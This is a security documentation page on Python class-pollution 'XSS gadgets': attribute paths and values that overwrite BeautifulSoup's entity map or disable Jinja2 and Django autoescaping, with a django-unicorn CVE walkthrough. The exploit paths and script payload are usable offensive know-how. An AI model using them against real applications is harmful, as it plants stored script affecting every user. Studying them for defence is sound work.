---
title: "XSS Gadgets"
weight: 2
---

# XSS Gadgets

Cross-Site Scripting gadgets allow the attacker to inject malicious scripts that execute in other users' browsers.

## Gadget 1: BeautifulSoup Entity Map Overwrite

**Mechanism**: Many Python web frameworks (including django-unicorn) use BeautifulSoup's `EntitySubstitution` class to escape HTML entities. The entity map maps characters like `<` to their safe equivalents (`&lt;`). Overwriting this map disables XSS protection.

**Key Path**:
```
__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<
```

**Value**:
```html
<script>alert(1337)</script>
```

**Effect**: Instead of escaping `<` to `&lt;`, the framework replaces it with the attacker's script tag. All user input rendered through this escape function now contains the injected script.

{{< hint danger >}}
This is a **universal stored XSS** — it affects all website users, not limited to a specific page. Every HTML entity escape operation on the server now injects the attacker's script.
{{< /hint >}}

### How It Works

```python
# Normal behavior:
EntitySubstitution.CHARACTER_TO_XML_ENTITY = {
    '<': '&lt;',
    '>': '&gt;',
    '&': '&amp;',
    '"': '&quot;',
}

# After pollution:
EntitySubstitution.CHARACTER_TO_XML_ENTITY = {
    '<': '<script>alert(1337)</script>',  # Polluted!
    '>': '&gt;',
    '&': '&amp;',
    '"': '&quot;',
}

# Template rendering:
escape("<user input>")  
# → "<script>alert(1337)</script>user input&gt;"
```

## Gadget 2: Jinja2 Autoescape Disable

**Mechanism**: If Jinja2's autoescape setting is accessible, disabling it removes all XSS protection from templates.

**Key Path** (application-specific):
```
__init__.__globals__.sys.modules.jinja2.Environment.autoescape
```

**Value**: `False`

**Effect**: All template variables rendered without escaping.

## Gadget 3: Django Template Engine Settings

**Mechanism**: Django's template settings control whether autoescape is enabled globally.

**Key Path**:
```
__init__.__globals__.sys.modules.django.conf.settings.TEMPLATES[0].OPTIONS.autoescape
```

**Value**: `False`

## Real-World Example: django-unicorn (CVE-2025-24370)

In django-unicorn, the BeautifulSoup entity map overwrite achieves universal stored XSS:

1. Attacker sends a crafted WebSocket message with the pollution payload
2. The server processes it through `set_property_value`, which does unrestricted attribute traversal
3. `CHARACTER_TO_XML_ENTITY['<']` is overwritten with a script tag
4. All subsequent HTML rendering for all users includes the injected script

**Impact**: Every page served by the application now contains the attacker's JavaScript, affecting all users globally.
